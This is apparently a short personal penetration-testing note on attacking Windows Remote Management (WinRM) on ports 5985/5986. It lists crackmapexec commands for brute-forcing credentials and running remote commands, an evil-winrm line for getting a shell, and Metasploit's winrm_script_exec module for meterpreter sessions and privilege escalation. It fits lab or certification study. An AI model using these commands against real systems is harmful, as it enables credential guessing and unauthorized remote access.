Not enabled by default
![](</Images/Pasted image 20231203173838.png>)

nmap default scan won't find. Either open range or ports 5985 or 5986 

#crackmapexec can brute force to get credentials or execute 
Examples:
>brute force
```bash
crackmapexec winrm $IP -u $USER -p $WORDLIST
```


>execute commands
>`crackmapexec winrm -u <user> -p <passowrd> -x <command>`


## evil-winrm 
Can be used to obtain a command shell
```bash
evil-winrm.rb -u $IP -p $PASSWORD -i $IP
```


#metasploit can be used for meterpreter session
`module winrm_script_exec`

Also has method check, returns two methods that show it can be brute forced with msfconsole

winrm cmd will allow executing commands.

Script to exploit winRM, meterpreter, and migrate/elevate privs. Needs credentials
`/windows/winrm/winrm_script_exec`

